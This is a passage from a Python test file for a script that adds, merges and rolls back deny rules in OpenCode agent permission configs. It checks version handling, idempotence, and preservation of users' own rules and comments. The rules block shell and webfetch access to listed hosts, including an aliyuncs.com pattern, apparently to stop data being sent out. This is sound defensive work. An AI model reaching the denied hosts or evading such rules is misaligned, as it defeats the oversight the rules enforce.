        r = subprocess.run([sys.executable, SCRIPT, path, "--deny-permissions"],
                           capture_output=True, text=True)
        return r.returncode, (r.stdout + r.stderr).strip()

    def perms_rm(path):
        r = subprocess.run([sys.executable, SCRIPT, path, "--remove-permissions"],
                           capture_output=True, text=True)
        return r.returncode, (r.stdout + r.stderr).strip()

    expected2 = ([{"action": "shell", "resource": p, "effect": "deny"} for p in m.DENY_BASH]
                 + [{"action": "webfetch", "resource": p, "effect": "deny"} for p in m.DENY_BASH])

    def acts2(path, *commands):
        perms = jsonc(path).get("permissions")
        return [m._v2_action(perms, "shell", c) for c in commands]

    r = subprocess.run([sys.executable, SCRIPT, "--deny-permissions"], capture_output=True, text=True)
    assert r.returncode == 0 and json.loads(r.stdout) == expected2, r.stdout
    assert m.deny_permissions_v2() == expected2

    # the 2.x array carries webfetch rules after the shell ones; the last match wins, so a URL
    # naming a denied host reads deny and an ordinary URL reads none (the default approve holds).
    p = write(tmp, '{}\n')
    rc, out = deny2(p)
    perms = jsonc(p)["permissions"]
    assert rc == 0 and [r["action"] for r in perms] == ["shell"] * 3 + ["webfetch"] * 3, perms
    assert [m._v2_action(perms, "webfetch", u) for u in (wf_oss, wf_meta, wf_other)] == ["deny", "deny", None], perms
    rc, out = deny2(p)
    assert rc == 0 and "hold already" in out, out
    # a rollback (--remove-permissions) still recognises the 6-rule array as ours and takes it out.
    rc, out = perms_rm(p)
    assert rc == 0 and "was removed" in out and "permissions" not in jsonc(p), out

    # --deny-bash alone must never add the v2 key: it would kill a 1.x reading the file.
    p = write(tmp, json.dumps({"permission": {"bash*": rules}}))
    rc, out = deny(p)
    assert rc == 0 and "permissions" not in jsonc(p), f"--deny-bash wrote v2 keys: {jsonc(p)}"

    # a config with only the 1.x block gains the array (kept intact), and a second run
    # is a no-op (the array is not duplicated).
    p = write(tmp, json.dumps({"permission": {"bash*": rules}}))
    rc, out = deny2(p)
    assert rc == 0 and "put last in its permissions" in out, out
    assert jsonc(p)["permission"] == {"bash*": rules}, jsonc(p)
    assert jsonc(p)["permissions"] == expected2, jsonc(p)["permissions"]
    assert acts2(p, oss, meta, other) == ["deny", "deny", None], acts2(p, oss, meta, other)
    before = open(p).read()
    rc, out = deny2(p)
    assert rc == 0 and "hold already" in out and open(p).read() == before, out
    # the rollback removes our array and keeps the 1.x block (the box goes back to 1.x)
    rc, out = perms_rm(p)
    assert rc == 0 and "was removed" in out, out
    assert "permissions" not in jsonc(p) and jsonc(p)["permission"] == {"bash*": rules}, jsonc(p)
    rc, out = perms_rm(p)
    assert rc == 0 and "no v2 permissions array" in out, out

    # an array we did not write is nobody's to delete
    p = write(tmp, json.dumps({"permissions": [{"action": "shell", "resource": "*", "effect": "ask"}]}))
    before = open(p).read()
    rc, out = perms_rm(p)
    assert rc == 1 and "not this box's deny array" in out and open(p).read() == before, out

    # the person's rules with ours appended after them (what --deny-permissions makes of their array):
    # left alone, and the message says whose rules are in it (review of v1.56.0, finding 4)
    m = load_module()
    mixed = [{"action": "shell", "resource": "*", "effect": "ask"}] + m.deny_permissions_v2()
    p = write(tmp, json.dumps({"permissions": mixed}))
    before = open(p).read()
    rc, out = perms_rm(p)
    assert rc == 1 and "holds rules of yours, with this box's deny rules last" in out, out
    assert open(p).read() == before, "the person's array is not touched"

    # an existing v2 array is kept; ours go after its last rule (a "*" before them cannot win),
    # and a comment beside the array survives.
    p = write(tmp, '{\n  // mine\n  "permissions": [\n'
                   '    {"action": "*", "resource": "*", "effect": "allow"}\n'
                   '  ]\n}\n')
    rc, out = deny2(p)
    assert rc == 0 and "put last" in out, out
    assert jsonc(p)["permissions"][0] == {"action": "*", "resource": "*", "effect": "allow"}
    assert jsonc(p)["permissions"][1:] == expected2, jsonc(p)["permissions"]
    assert acts2(p, oss, meta, other) == ["deny", "deny", "allow"], acts2(p, oss, meta, other)
    assert "// mine" in open(p).read(), "a comment was dropped"

    # a rule added after ours that allows the host is overridden again at the next run.
    body = jsonc(p)
    body["permissions"].append({"action": "shell", "resource": "*aliyuncs.com*", "effect": "allow"})
    open(p, "w").write(json.dumps(body, indent=2) + "\n")
    assert acts2(p, oss) == ["allow"], acts2(p, oss)
    rc, out = deny2(p)
    assert rc == 0 and "put last" in out and acts2(p, oss) == ["deny"], out

    # a "permissions" that is not an array of rules is not guessed at.
    for value in ("allow", [{"action": "shell", "resource": "*", "effect": 1}], ["x"]):
        body = json.dumps({"permissions": value})
        p = write(tmp, body)
        rc, out = deny2(p)
        assert rc == 1 and "refused" in out and open(p).read() == body, f"{value!r}: {rc} {out}"

    # a comment between "{" and the first member (or the "}" of an empty object) survives an insert:
    # blank() turns it into spaces, and set_member used to splice over that gap (review of v1.56.0,
    # finding 2: `"compaction": { /* mine */ "prune": false }` lost its comment on a v2 install)
    m = load_module()
    for body, note in (('{"compaction": { /* mine */ "prune": false }}', "/* mine */"),
                       ('{"compaction": { // note\n}}', "// note"),
                       ('{"compaction": {/* a */}}', "/* a */")):
        out = m.set_member(body, ["compaction"], "keep", '{"tokens": 1}')
        assert note in out, f"{body!r}: the comment is gone: {out!r}"
        doc = m.load(out)
        assert doc["compaction"]["keep"] == {"tokens": 1}, out
        assert (doc["compaction"].get("prune") is False) == ("prune" in body), out
        # and the same insert twice is the same text (no drift)
        again = m.set_member(out, ["compaction"], "keep", '{"tokens": 1}')
        assert again == out, f"{body!r}: a second pass changed the text: {again!r}"

    # 12. The Agent unit's values are this repo's alone, on both majors: the wildcard allow, then the shell and the
    #     webfetch rules. They take no argument (a path after the flag is not that mode). The person's own deny
    #     rules are NOT repeated there: on OpenCode 2 the content merges after every file, so its allow overrides
    #     them, which the install's note and SECURITY.md say (a first attempt at repeating them was taken back out
    #     before any release, its review of 2026-11-23 having found it read too few files and misread "*" rules).
    allow_all = {"action": "*", "resource": "*", "effect": "allow"}
    r = subprocess.run([sys.executable, SCRIPT, "--agent-auto-config-content"], capture_output=True, text=True)
    assert r.returncode == 0 and json.loads(r.stdout) == {"permissions": [allow_all] + m.deny_permissions_v2()}, r.stdout
    r = subprocess.run([sys.executable, SCRIPT, "--agent-auto-permission"], capture_output=True, text=True)
    assert r.returncode == 0 and list(json.loads(r.stdout)) == ["*", "*bash", "*webfetch"], r.stdout
    for mode in ("--agent-auto-config-content", "--agent-auto-permission"):
        r = subprocess.run([sys.executable, SCRIPT, mode, os.path.join(tmp, "absent.json")], capture_output=True, text=True)
        assert r.returncode != 0, f"a path after {mode} is not that mode"
    # the values hold no character systemd reads inside Environment='...' (a quote, a backslash, a percent sign):
    # install-agent.sh writes them as they are
    for value in (m.agent_auto_config_content(), m.agent_auto_permission()):
        assert not set(value) & set("'\\%\n"), value

    # an EMPTY "permissions" array is the person's, not this box's deny array: the rollback leaves it alone and
    # says so (second review, 2026-11-23: it was removed with "the box's v2 deny array was removed"), and a
    # global config that holds one is not "only this box's" for --remove-providers
    empty = os.path.join(tmp, "empty_permissions.json")
    body = '{"permissions": [], "x": 1}\n'
    open(empty, "w").write(body)
    r = subprocess.run([sys.executable, SCRIPT, empty, "--remove-permissions"], capture_output=True, text=True)
    assert r.returncode == 1 and "not this box's deny array" in r.stdout and open(empty).read() == body, r.stdout
    assert m._only_ours_v2(m.deny_permissions_v2()) and m._only_ours_v2(m.deny_permissions_v2_before_v157())
    assert not m._only_ours_v2([]) and not m._only_ours_v2([allow_all] + m.deny_permissions_v2())

    # a box that served OpenCode 2 on v1.56.0 holds the three shell rules alone. The merge of v1.57.0 must
    # put the webfetch rules after them WITHOUT repeating the shell ones (it appended all six: nine rules,
    # three twice), and the rollback to 1.x must still take the whole array out, in both shapes: left in
    # place, 1.19 refuses to start ("V2 permissions are not supported"). Measured red on 2026-11-23.
    before157 = [{"action": "shell", "resource": pt, "effect": "deny"} for pt in m.DENY_BASH]
    p = write(tmp, json.dumps({"permissions": before157, "x": 1}, indent=2))
    rc, out = deny2(p)
    assert rc == 0 and jsonc(p)["permissions"] == expected2, f"{out}: {jsonc(p)['permissions']}"
    rc, out = deny2(p)
    assert rc == 0 and "unchanged" in out and jsonc(p)["permissions"] == expected2, out
    rc, out = perms_rm(p)
    assert rc == 0 and "permissions" not in jsonc(p) and jsonc(p)["x"] == 1, out
    # the shape of v1.56.0, never merged again, is still this box's array
    p = write(tmp, json.dumps({"permissions": before157}))
    rc, out = perms_rm(p)
    assert rc == 0 and "permissions" not in jsonc(p), out
    # the rules of v1.56.0 followed by all of today's (what the first build of this merge wrote): ours too
    p = write(tmp, json.dumps({"permissions": before157 + expected2}))
    rc, out = perms_rm(p)
    assert rc == 0 and "permissions" not in jsonc(p), out
    # a person's rule before ours, in either shape: theirs, left alone, and the message says so
    for ours_shape in (before157, expected2):
        mixed = [{"action": "shell", "resource": "*", "effect": "ask"}] + ours_shape
        p = write(tmp, json.dumps({"permissions": mixed}))
        rc, out = perms_rm(p)
        assert rc == 1 and "holds rules of yours" in out and jsonc(p)["permissions"] == mixed, out
    # and the person's rules followed by the shell rules of v1.56.0 get only the webfetch rules after them
    p = write(tmp, json.dumps({"permissions": [{"action": "edit", "resource": "*.env", "effect": "deny"}] + before157}))
    rc, out = deny2(p)
    assert rc == 0 and jsonc(p)["permissions"] == [{"action": "edit", "resource": "*.env", "effect": "deny"}] + expected2, jsonc(p)

    print("test_oc_merge_limits: OK")


if __name__ == "__main__":
    sys.exit(main())
